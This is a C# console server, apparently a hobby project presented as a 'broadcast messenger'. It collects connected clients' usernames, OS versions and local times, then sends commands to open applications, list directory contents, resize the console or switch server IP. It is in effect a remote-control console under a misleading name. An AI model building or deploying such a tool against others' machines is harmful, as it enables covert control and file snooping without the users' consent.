using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using ClientServer;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace BroadcastMessengerConsole
{
    class UserInfo
    {
        [JsonPropertyName("OS name")]
        public string OSname { get; set; }

        [JsonPropertyName("OS version")]
        public string OSver { get; set; }

        [JsonPropertyName("Local Time")]
        public string LocalTime { get; set; }

        public UserInfo()
        {
            this.OSname = Environment.UserName;
            this.OSver = Environment.OSVersion.ToString();
            this.LocalTime = DateTime.Now.ToString();
        }


    }
    class Program
    {
        static void Main(string[] args)
        {
            Server server = new Server("127.0.0.1", 8000);
            server.Start();
            Task task = new Task(() => server.ConnectionUpdate());
            task.Start();

            while (true)
            {

                if (server.handler.Count != 0)
                {
                    //Console.WriteLine(Server.FromBytesToString(server.Get(0)));
                    UserInfo tmp = JsonSerializer.Deserialize<UserInfo>(Server.FromBytesToString(server.Get(0)));
                    Console.WriteLine(tmp.LocalTime);

                    Console.WriteLine("\n[1] - Open app");
                    Console.WriteLine("[2] - Get files");
                    Console.WriteLine("[3] - Change console res");
                    Console.WriteLine("[4] - Change IP");
                    int menu = int.Parse(Console.ReadLine());
                    int index = 0;

                    switch (menu)
                    {

                        case 1:
                            {
                                server.ShowAllUsers(server);

                                do
                                {
                                    Console.WriteLine("Enter index of user:");

                                    index = int.Parse(Console.ReadLine()) - 1;
                                } while (index < 0 || index > server.handler.Count - 1);

                                Console.WriteLine("Enter \"--open\" and app path");
                                string str = Console.ReadLine();
                                server.Send(Server.FromStringToBytes(str), index);

                                break;
                            }
                        case 2:
                            {
                                server.ShowAllUsers(server);
                                do
                                {
                                    Console.WriteLine("Enter index of user:");

                                    index = int.Parse(Console.ReadLine()) - 1;
                                } while (index < 0 || index > server.handler.Count - 1);

                                Console.WriteLine("Enter \"--files\" and directory path");
                                string str = Console.ReadLine();
                                server.Send(Server.FromStringToBytes(str), index);

                                str = Server.FromBytesToString(server.Get(index));
                                Console.WriteLine(str);
                                break;
                            }
                        case 3:
                            {
                                server.ShowAllUsers(server);
                                do
                                {
                                    Console.WriteLine("Enter index of user:");

                                    index = int.Parse(Console.ReadLine()) - 1;
                                } while (index < 0 || index > server.handler.Count - 1);

                                Console.WriteLine("Enter \"--res\" and console size like this: 30,30");
                                string str = Console.ReadLine();
                                server.Send(Server.FromStringToBytes(str), index);

                                Console.WriteLine(str);
                                break;
                            }
                        case 4:
                            {
                                server.ShowAllUsers(server);
                                do
                                {
                                    Console.WriteLine("Enter index of user:");

                                    index = int.Parse(Console.ReadLine()) - 1;
                                } while (index < 0 || index > server.handler.Count - 1);

                                Console.WriteLine("Enter \"--ip\" and new ip");
                                string str = Console.ReadLine();
                                server.Send(Server.FromStringToBytes(str), index);

                                Console.WriteLine(str);
                                break;
                            }
                        default:
                            break;
                    }

                }
            }

            server.Close();
        }
    }
}
